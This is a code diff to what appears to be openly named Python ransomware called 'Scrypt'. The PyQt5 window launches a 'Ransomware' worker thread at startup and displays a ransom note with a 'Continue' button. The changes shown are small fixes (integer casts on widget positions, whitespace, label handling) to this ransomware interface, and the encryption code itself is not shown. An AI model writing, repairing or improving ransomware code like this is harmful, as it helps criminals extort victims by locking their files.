@@ -125,12 +125,12 @@ class Ransomware(PyQt5.QtCore.QRunnable):
 
 class Scrypt(PyQt5.QtWidgets.QMainWindow):
     def __init__(self):
-        super().__init__()
+        super().__init__() 
         self.threadpool = PyQt5.QtCore.QThreadPool()
         self.initUI()
         self.banner()
         self.cont()
-        self.readMe()
+        self.readMe()   
         self.show()
         self.threadpool.start(Ransomware())
 
@@ -142,12 +142,12 @@ class Scrypt(PyQt5.QtWidgets.QMainWindow):
                     QMainWindow{
                         background-color: #212121;
                         }
-                    """)
+                    """)  
 
     def cont(self):
         btn = PyQt5.QtWidgets.QPushButton('Continue', self)
         btn.resize(750, 50)
-        btn.move((self.frameGeometry().width()) / 3.35, 900)
+        btn.move(int(self.frameGeometry().width() / 3.35), 900)
         btn.setStyleSheet("""
                         QPushButton{
                             background-color: #d50000;
@@ -163,25 +163,25 @@ class Scrypt(PyQt5.QtWidgets.QMainWindow):
         btn.clicked.connect(self.hide)
 
     def readMe(self):
-        rm = PyQt5.QtWidgets.QLabel(ransomNote, self)
+        rm = PyQt5.QtWidgets.QLabel(ransomNote, self) 
         rm.setStyleSheet("""
-                            QLabel{
-                            background-color: #d50000;
-                            color: #000000;
-                            border: 2px solid #ff5131;
-                            border-radius: 7.5px;
-                            font-weight: 1200;
-                            font-size: 18px;
-                            }
-                        """)
+                        QLabel{
+                        background-color: #d50000;
+                        color: #000000;
+                        border: 2px solid #ff5131;
+                        border-radius: 7.5px;
+                        font-weight: 1200;
+                        font-size: 18px;
+                        }
+                    """)
         rm.resize(750, 650)
-        rm.move(self.frameGeometry().width() / 3.35, 220)
+        rm.move(int(self.frameGeometry().width() / 3.35), 220)
         rm.setAlignment(PyQt5.QtCore.Qt.AlignCenter)
         rm.show()
 
     def banner(self):
-        flair = PyQt5.QtWidgets.QLabel('Scrypt', self)
-        flair.setStyleSheet("""
+        self.flair = PyQt5.QtWidgets.QLabel('Scrypt', self) 
+        self.flair.setStyleSheet("""
                             QLabel{
                             background-color: #d50000;
                             color: #000000;
@@ -191,10 +191,10 @@ class Scrypt(PyQt5.QtWidgets.QMainWindow):
                             font-size: 45px;
                             }
                         """)
-        flair.resize(800, 130)
-        flair.move(self.frameGeometry().width() / 3.5, 50)
-        flair.setAlignment(PyQt5.QtCore.Qt.AlignCenter)
-        flair.show()
+        self.flair.resize(800, 130)
+        self.flair.move(int(self.frameGeometry().width() / 3.5), 50)
+        self.flair.setAlignment(PyQt5.QtCore.Qt.AlignCenter)
+        self.flair.show()
 
     @PyQt5.QtCore.pyqtSlot()
     def hide(self):
